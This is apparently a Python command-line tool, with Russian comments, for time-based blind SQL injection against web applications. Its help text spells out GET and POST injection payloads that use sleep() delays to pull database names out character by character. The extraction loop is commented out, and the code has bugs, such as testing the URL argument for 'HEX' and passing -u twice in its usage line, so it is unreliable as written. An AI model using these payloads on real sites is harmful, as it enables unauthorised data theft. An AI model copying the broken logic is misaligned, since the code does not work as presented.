from timeit import default_timer as timer  # библиотека измерения времени
import requests  # библиотека HTTP запросов
import argparse
parser = argparse.ArgumentParser(description='blind sql injection', usage='Script options')
parser.add_argument('-get', help='HTTP GET method. Example: python3 blind_sql.py -get -u "http://example.com:1337?id=1 \
and (case when ASCII(substring((SELECT database() limit 0,1), {}, 1))={} THEN sleep(3) END) -- -" ',
                    action="store_true")
parser.add_argument('-post',
                    help='HTTP POST method. Example: python3 blind_sql.py -post -u "http://example.com:1337" -param "name" -value "5 and IF(ASCII(substring((SELECT database()), {}, 1))>{},sleep(0.025),1) #"',
                    action="store_true")
parser.add_argument('-u', type=str, help='Enter URL', )
parser.add_argument('-value', type=str, help='Data string to be sent through POST')
parser.add_argument('-param', type=str, help='Data string to be sent through POST (e.g. "id=1")')
parser.add_argument('-type', type=str, help='Type strings (e.g. "-type HEX", "-type ACII")', )
args = parser.parse_args()


def greetings():
    """Функция отображает приветствие пользователя"""
    print('''BLIND SQL INJECTION''')


def blind_sql():
    i = 1  # начальное значение инкремента
    print('Print result:')
    # while (i <= length_result):  # Цикл while будет выполняться пока не дойдем до конца возможной длинны
    #     # print('i:', i)
    #     for char in dictionary:  # Цикл for по нашему словарю dictionary
    #         start_time = timer()  # Начальное время
    #         if args.get == True:
    #             res = requests.get(args.u.format(i, char))
    #         elif args.post == True:
    #             res = requests.post(args.u, data={args.param: args.value.format(i, char)})
    #             # функция format подставляет значения из i и char в запрос вместо {}
    #         end_time = timer()  # Конечное время
    #         time = end_time - start_time  # Затраченное время
    #         print(chr(char),
    #               time)  # просмотр всех результатов для определения подходящего времени переменной time для вывода релевантных результатов
    #         if time > 2:  # вывод только релевантных результатов
    #             # print(chr(char), end='\n', flush=True)
    #             print(chr(char), end='', flush=True)
    #             break
    #     i += 1  # Двигаемся далее


if __name__ == "__main__":
    length_result = int(input('Input length: '))  # Возможная длинна строки
    print(args.u.upper())
    if args.u.upper() == 'HEX':
        dictionary = list(range(0,10)) + list(range(ord('A'), ord('F')+1))
    else:
        dictionary = list(range(48, 58)) + list(range(95, 126))  # Список кодов ASCII возможных симолов
    print(dictionary)

    if not args.get and not args.post:
        parser.error('Argument not specified. Use -get or -post')

    greetings()
    blind_sql()

# python3 main.py -post -u "http://192.168.0.1/" -u HEX